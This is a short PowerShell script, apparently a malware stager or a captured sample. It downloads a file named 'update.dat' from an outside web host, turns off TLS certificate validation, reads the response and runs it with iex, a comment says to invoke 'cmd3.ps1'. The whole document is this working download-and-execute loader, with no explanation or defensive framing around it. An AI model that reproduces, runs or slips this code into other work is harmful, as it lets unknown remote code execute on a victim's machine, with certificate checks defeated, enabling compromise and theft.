$r1=[System.Net.WebRequest]::Create('https://sun-city-cafe.com/update.dat');
[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$True};
$r2=$r1.GetResponse();
$r3=$r2.GetResponseStream();
$r4=new-object System.IO.StreamReader $r3;
$r5=$r4.ReadToEnd();

# invokes cmd3.ps1
iex($r5)